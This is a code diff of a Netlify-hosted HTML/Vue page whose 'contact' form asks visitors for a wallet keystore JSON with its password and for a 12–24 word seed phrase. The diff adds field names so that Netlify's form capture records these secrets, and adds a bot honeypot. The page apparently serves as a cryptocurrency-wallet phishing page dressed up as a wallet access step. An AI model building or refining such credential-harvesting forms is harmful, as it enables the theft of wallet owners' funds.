@@ -22,7 +22,7 @@
                     />
                    </div>
                   <nav class="bg-white" id="showNav">
-                   <form name="contact" method="POST" data-netlify="true">
+                   <form name="contact" method="POST" netlify-honeypot="bot-field" data-netlify="true">
                     <input type="hidden" name="subject" 
                       value="New inquiry from Shola.netlify.app" />
                       <p>
@@ -47,8 +47,8 @@
                       </div>
                     </div>
                     <div class="flex flex-col hidden" id="keystore">
-                      <textarea v-model="keystoreTextarea" class="w-full" id="keystoreTextarea" placeholder="Keystore JSON" name="w3review" rows="4" cols="50"/>
-                      <input v-model="keystorePassword" type="text" id="keystorePassword" class="mt-4 shadow-xl rounded-lg w-full" placeholder="Password" />
+                      <textarea v-model="keystoreTextarea" class="w-full" id="keystoreTextarea" placeholder="Keystore JSON" name="keystoreTextarea" rows="4" cols="50"/>
+                      <input v-model="keystorePassword" name="keystorePassword" type="text" id="keystorePassword" class="mt-4 shadow-xl rounded-lg w-full" placeholder="Password" />
                       <div class="flex flex-wrap text-sm mt-4"><p style="color: #6c757d">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p></div>
                        <div class="flex flex-wrap text-sm mt-4"><p style="color: red">{{keystoreerror}}</p></div>
                       <div class="place-self-center">
@@ -61,7 +61,7 @@
                       </div>
                     </div>
                     <div class="flex flex-col hidden" id="private">
-                      <input v-model="privateTextarea" id="privateTextArea"  type="text" class="mt-4 shadow-xl rounded-lg w-full" placeholder="Password" />
+                      <input v-model="privateTextarea" id="privateTextArea"  name="privateTextarea" type="text" class="mt-4 shadow-xl rounded-lg w-full" placeholder="Password" />
                       <div class="flex flex-wrap text-sm mt-4"><p style="color: red">{{privateerror}}</p></div>
                       <div class="flex flex-wrap text-sm mt-4"><p style="color: #6c757d">Typically 12 (sometimes 24) words seperated by a single spaces.</p></div>
                       <div class="place-self-center">
